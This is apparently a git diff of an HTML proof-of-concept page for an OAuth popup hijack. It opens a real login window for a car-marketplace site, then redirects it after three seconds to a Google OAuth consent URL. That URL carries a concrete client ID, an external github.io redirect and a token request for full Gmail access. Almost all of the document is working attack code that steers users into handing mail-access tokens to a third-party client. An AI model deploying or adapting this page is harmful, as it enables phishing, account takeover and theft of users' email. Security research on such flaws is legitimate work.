@@ -1,31 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Popup Hijack Test</title>
+  <title>OAuth Hijack Test</title>
 </head>
 <body>
-  <h2>OAuth Flow Hijack Test</h2>
-  <button onclick="testHijack()">Start Test</button>
+  <h2>OAuth Flow Hijack PoC</h2>
+  <button onclick="launch()">Start Attack</button>
 
   <script>
-    function testHijack() {
-      // Open a login popup (simulate victim OAuth login)
-      const win = window.open('https://id.mobile.de/login?service=https%3A%2F%2Fid.mobile.de%2Foauth2.0%2FcallbackAuthorize%3Fclient_id%3Dmobile_web_DL1WJUPw%26redirect_uri%3Dhttps%253A%252F%252Fwww.mobile.de%252Fapi%252Fauth%252FloginCallback%253F%26response_type%3Dcode%26response_mode%3Dquery%26client_name%3DCasOAuthClient&lang=de&cf_template=OTP&state=eyJybmQiOiJfWGwxVlRyQjVmakR6Q0lzb1Q1TTB0NHB0cmwtRjlhT01VV2tJRXFXd1dZIiwic3JjIjoiaHR0cHM6Ly9ob21lLm1vYmlsZS5kZS9yZWdpb25hbC1hc3NldHMvX25leHQvc3RhdGljL2Nzcy9kZDcyNjYyZjFiYjBkOTQ3LmNzcyIsImNmIjoiT1RQIn0%3D&nonce=VZxlgnNTUqRs6aajJ6MOO-0-IS0735AWk8l-nfkpdTI&scope=openid', '_blank', 'width=900,height=700');
-
-      if (!win) {
-        alert('Popup blocked or not returned!');
-        return;
-      }
-
-      console.log('Popup opened. Attempting to hijack after delay...');
-
-      // Attempt to redirect the popup after 3 seconds
+    // ****** Replace with your login url ************
+    const loginTarget = "https://id.mobile.de/login?service=https%3A%2F%2Fid.mobile.de%2Foauth2.0%2FcallbackAuthorize%3Fclient_id%3Dmobile_web_DL1WJUPw%26redirect_uri%3Dhttps%253A%252F%252Fwww.mobile.de%252Fapi%252Fauth%252FloginCallback%253F%26response_type%3Dcode%26response_mode%3Dquery%26client_name%3DCasOAuthClient&lang=de&state=eyJybmQiOiJVRVRKN0NBVXJQTjh0dDRoaktDdWVSMXc1ZjdzdkpLS0FZR2VZSW1VVFBRIiwic3JjIjoiaHR0cHM6Ly93d3cubW9iaWxlLmRlLyJ9&nonce=99uLxNCzK7LwcdHRpwW1GxgONlor58wuOoTmOa8dGgk&scope=openid" 
+    const maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
+    function launch() {
+      const win = window.open(loginTarget, "_blank", "width=900,height=700");
       setTimeout(() => {
         try {
-          win.location.replace("https://accounts.google.com/o/oauth2/v2/auth?client_id=YOUR_MALICIOUS_CLIENT_ID&redirect_uri=https://your-redirect-url.com&response_type=token&scope=openid%20email");
-          console.log("Popup hijack attempt triggered.");
-        } catch (e) {
-          console.warn("Hijack attempt blocked:", e);
+          win.location.replace(maliciousOAuthUrl);
+          console.log("Redirected login window to malicious OAuth client.");
+        } catch (err) {
+          console.warn("Window manipulation blocked:", err);
         }
       }, 3000);
     }
